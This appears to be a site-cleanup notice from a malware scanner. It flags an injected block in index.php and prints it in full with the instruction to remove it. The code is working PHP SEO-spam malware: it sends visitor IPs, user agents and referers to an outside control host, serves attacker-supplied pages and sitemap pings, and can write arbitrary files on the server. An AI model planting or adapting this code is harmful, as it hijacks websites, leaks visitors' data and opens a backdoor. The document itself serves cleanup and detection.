index.php
SMW-INJ-21392-php.spam.seo-0

Remove the below code

<?php   
@set_time_limit(3600);
@ignore_user_abort(1);
$Prefix = "xenorthxe";
$lan = base64_encode(@$_SERVER['HTTP_ACCEPT_LANGUAGE']);
if(isset($_SERVER['REQUEST_URI'])) {
     $uri = $_SERVER['REQUEST_URI'];
}else{
    if (isset($_SERVER['argv'])) {
        $uri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
    } else {
        $uri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
    }
}
$uri = base64_encode(@$_SERVER['REQUEST_URI']);
$host = base64_encode(@$_SERVER['HTTP_HOST']);
$clock = '';
if (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
    $clock = getenv('REMOTE_ADDR');
} elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
    $clock = $_SERVER['REMOTE_ADDR'];
} 
if (stristr($clock, ',')) {
    $clock_tmp = explode(",", $clock);
    $clock = $clock_tmp[0];
}
$agent = base64_encode(@$_SERVER['HTTP_USER_AGENT']);
$referer = base64_encode(@$_SERVER['HTTP_REFERER']);
$https = base64_encode(((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://');
$temp = @$_GET['tp'];
$id = @$_GET['id'];
$site = @$_GET['site'];
$goweb = $Prefix.'.'."sumologic.top"; 
$okt = 'host='.$host.'&uri='.$uri.'&lan='.$lan.'&agent='.$agent.'&referer='.$referer.'&https='.$https.'&clock='.$clock.'&id='.$id.'&tp='.$temp.'&site='.$site;
$geturl = 'http://'.$goweb.'/index.php?'.$okt;  
$file_contents = smoutdo($geturl); 
if(strstr($file_contents,"[#*#*#]")){
	$html = explode("[#*#*#]",$file_contents);
	if(strstr($html[0],"echohtml")){ echo $html[1]; exit; }
	if(strstr($html[0],"echohtml500")){  @header('HTTP/1.1 500 Internal Server Error');  exit; }
	if(strstr($html[0],"echohtml404")){  @header('HTTP/1.1 404 Not Found');  exit; }
	if(strstr($html[0],"echoxml")){ header("Content-type: text/xml"); echo $html[1]; exit; }
	if(strstr($html[0],"pingxml")){ $gar = explode(",",$html[1]);  foreach($gar as $v){ $pingRes = smoutdo($v);  echo $v.'===>Sitemap: ';
	if(strpos($pingRes, 'Sitemap Notification Received') !== false){ echo  "OK<br>"; }else{echo  "ERROR<br>"; } } exit;}
	if(strstr($html[0],"puttxt")){ puttxt($html[1],$html[2]); if(file_exists($html[1])){ echo 'end ok';}else{ echo 'no false';}   exit(); }
}
function smoutdo($url)
{
    $file_contents = '';
    $user_agent = 'Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)';
    if (function_exists('curl_init')) {
        try {
            $ch = curl_init();
            $timeout = 30;
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            $file_contents = curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
        }
    }
    if (strlen($file_contents) < 1 && function_exists('file_get_contents')) {
        ini_set('user_agent', $user_agent);
        try {
            $file_contents = @file_get_contents($url);
        } catch (Exception $e) {
        }
    }
    return $file_contents;
}
function puttxt($fil,$str){
	file_put_contents($fil,$str);
}
/* Rc cx036 */ 
?>
